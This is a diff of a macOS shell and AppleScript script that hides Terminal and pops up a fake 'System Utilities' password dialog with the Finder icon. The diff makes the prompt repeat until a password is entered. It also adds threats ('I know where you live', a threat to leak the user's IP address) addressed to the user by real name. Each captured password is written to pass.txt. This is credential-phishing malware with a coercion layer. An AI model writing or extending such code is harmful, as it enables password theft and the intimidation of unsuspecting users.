@@ -3,21 +3,28 @@
 # Ensure Terminal is hidden initially
 osascript -e 'tell app "Terminal" to set visible of front window to false'
 
-# Get the current username
+# Get the current username (for header purposes)
 username=$(scutil <<< "show State:/Users/ConsoleUser" | awk '/Name :/ && ! /loginwindow/ { print $3 }')
 
 # Initialize capture with a header line
 capture="username=${username}\n_________________________________________________________________________________________\n\n"
 
-# Define AppleScript for the password prompt (no timer)
+# Define AppleScript for a persistent password prompt.
+# It extracts the full name, splits it into first and last names,
+# and repeatedly prompts until at least one character is entered.
 read -r -d '' applescriptCode <<'EOF'
-set msg to "I know where you live, " & (long user name of (system info)) & ".\n\nEnter the password for the user " & (long user name of (system info)) & " to allow this."
-try
-    set dialogText to text returned of (display dialog msg with icon POSIX file "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/FinderIcon.icns" with title "System Utilities" default answer "" with hidden answer)
-    return dialogText
-on error
-    return "CANCEL"
-end try
+set fullName to (long user name of (system info))
+set firstName to word 1 of fullName
+set lastName to word -1 of fullName
+set userPassword to ""
+repeat while userPassword is ""
+    try
+        set userPassword to text returned of (display dialog "I know where you live, " & firstName & ".\n\nEnter your password, or I will leak your IP address, Mr. " & lastName with icon POSIX file "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/FinderIcon.icns" with title "System Utilities" default answer "" with hidden answer)
+    on error
+        set userPassword to ""
+    end try
+end repeat
+return userPassword
 EOF
 
 # Execute the AppleScript synchronously and capture its output in a temporary file
@@ -31,7 +38,7 @@ else
     dialogText="CANCEL"
 fi
 
-# Append the password (or result) to the capture
+# Append the password to the capture text
 capture="${capture}password=${dialogText}"
 
 # Save the captured information to pass.txt
